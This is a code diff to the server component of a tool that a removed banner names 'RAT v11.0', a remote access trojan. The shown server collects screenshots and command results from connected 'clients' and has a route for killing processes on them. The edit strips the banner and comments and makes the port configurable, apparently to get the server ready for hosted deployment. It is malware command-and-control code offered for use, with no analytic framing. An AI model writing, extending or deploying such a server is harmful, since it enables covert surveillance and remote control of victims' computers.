@@ -22,26 +22,17 @@ def bmp_to_png_base64(bmp_base64):
         bmp_data = base64.b64decode(bmp_base64)
         if len(bmp_data) < 54:
             return bmp_base64
-        
-        # Cabecera BMP
         width = int.from_bytes(bmp_data[18:22], 'little')
         height = int.from_bytes(bmp_data[22:26], 'little')
         bit_count = int.from_bytes(bmp_data[28:30], 'little')
-        
-        # Offset de datos
         offset = 54
         if bmp_data[0:2] == b'BM':
             offset = int.from_bytes(bmp_data[10:14], 'little')
-        
-        # Tamaño de imagen
         image_size = int.from_bytes(bmp_data[34:38], 'little')
         if image_size == 0:
             row_size = ((width * bit_count + 31) // 32) * 4
             image_size = row_size * abs(height)
-        
         pixel_data = bmp_data[offset:offset+image_size]
-        
-        # Crear imagen
         if bit_count == 24:
             img = Image.frombytes('RGB', (width, abs(height)), pixel_data, 'raw', 'BGR')
         elif bit_count == 32:
@@ -49,10 +40,8 @@ def bmp_to_png_base64(bmp_base64):
             img = img.convert('RGB')
         else:
             return bmp_base64
-        
         if height < 0:
             img = img.transpose(Image.FLIP_TOP_BOTTOM)
-        
         output = io.BytesIO()
         img.save(output, format='PNG')
         return base64.b64encode(output.getvalue()).decode('utf-8')
@@ -106,7 +95,6 @@ def upload():
         
         if client_id and image_data and client_id in clients:
             if result_type == 'screen':
-                # Convertir BMP a PNG para mostrar
                 png_data = bmp_to_png_base64(image_data)
                 clients[client_id]['captures'].append({
                     'timestamp': datetime.now().isoformat(),
@@ -116,7 +104,6 @@ def upload():
                 })
                 print(f"Screenshot from {client_id} saved")
             else:
-                # Para resultados de texto
                 clients[client_id]['captures'].append({
                     'timestamp': datetime.now().isoformat(),
                     'data': image_data,
@@ -290,10 +277,5 @@ def kill_process(client_id):
         return jsonify({'status': 'error'}), 400
 
 if __name__ == '__main__':
-    print("=" * 50)
-    print("RAT v11.0 - SERVER")
-    print("=" * 50)
-    print("Port: 5000")
-    print("URL: http://localhost:5000")
-    print("=" * 50)
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
